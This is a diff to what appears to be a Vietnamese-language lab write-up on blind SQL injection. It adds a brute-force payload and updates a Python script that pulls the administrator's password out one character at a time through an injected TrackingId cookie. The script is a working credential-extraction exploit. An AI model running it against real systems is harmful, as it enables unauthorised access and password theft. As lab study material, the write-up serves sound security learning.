@@ -122,6 +122,9 @@ Theo như số thứ tự của payload 1 sẽ cho ra password:
 
 # Scrypt Python
 
+## Payload Brute Force
+`SELECT trackingId FROM someTable WHERE trackingId = 'oLNIUOwSGHWlzJH1' and (select substring(password,1,1) from users where username='administrator')='a'--`
+
 ```
 import requests
 import string
@@ -137,13 +140,14 @@ print("[+] Extract Info")
 
 for i in range(1, length+1):
     for char in characters:
-    	payload = "<TrackingId'SELECT 'a' from users WHERE username = 'administrator' AND substring(password,%i,1)='%s'--" %(i, char)
-    	print("Trying Number %i with: " %(i), char)
-    	cookie = {"TrackingId":payload}
-    	response = requests.get(url, cookies=cookie)
-    	if trust_string in response.content.decode('utf-8'):
-    		result += char
+        payload = f"<Cookie-TrackingID>'and (select substring(password,{i},1) from users where username='administrator')='{char}'-- "
+        cookie = {"TrackingId":payload}
+        response = requests.get(url, cookies=cookie)
+        if trust_string in response.content.decode('utf-8'):
+            result += char
+            break
 
-    print("[+] Result is : ", result)
+    print(f"[+] Result at position {i}: {result}")
+
 ```
 
